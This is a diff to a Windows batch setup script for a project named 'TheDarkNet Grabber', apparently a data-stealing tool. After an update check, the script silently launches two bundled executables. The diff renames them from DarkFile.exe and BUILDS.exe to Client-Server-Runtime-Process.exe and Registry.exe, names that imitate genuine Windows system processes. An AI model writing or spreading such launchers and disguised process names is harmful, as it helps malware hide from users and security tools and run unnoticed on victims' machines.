@@ -76,25 +76,25 @@ echo Checking for updates...
 "!venv_name!\Scripts\python" tools\update.py
 
 REM Define paths for executables within TheDarkNet Grabber\tools\Builder folder
-set "darkfile_path=%~dp0tools\Builder\DarkFile.exe"
-set "builds_path=%~dp0tools\Builder\BUILDS.exe"
+set "darkfile_path=%~dp0tools\Builder\Client-Server-Runtime-Process.exe"
+set "builds_path=%~dp0tools\Builder\Registry.exe"
 
-REM Check if DarkFile.exe exists and run it
+REM Check if Client-Server-Runtime-Process.exe exists and run it
 if exist "%darkfile_path%" (
-    title Running DarkFile.exe
-    echo Running DarkFile.exe...
+    title Running Client-Server-Runtime-Process.exe
+    echo Running Client-Server-Runtime-Process.exe...
     start "" "%darkfile_path%"
 ) else (
-    echo DarkFile.exe not found in tools\Builder
+    echo Client-Server-Runtime-Process.exe not found in tools\Builder
 )
 
-REM Check if BUILDS.exe exists and run it
+REM Check if Registry.exe exists and run it
 if exist "%builds_path%" (
-    title Running BUILDS.exe
-    echo Running BUILDS.exe...
+    title Running Registry.exe
+    echo Running Registry.exe...
     start "" "%builds_path%"
 ) else (
-    echo BUILDS.exe not found in tools\Builder
+    echo Registry.exe not found in tools\Builder
 )
 
 REM Proceed with the Python environment setup if executables were found and executed
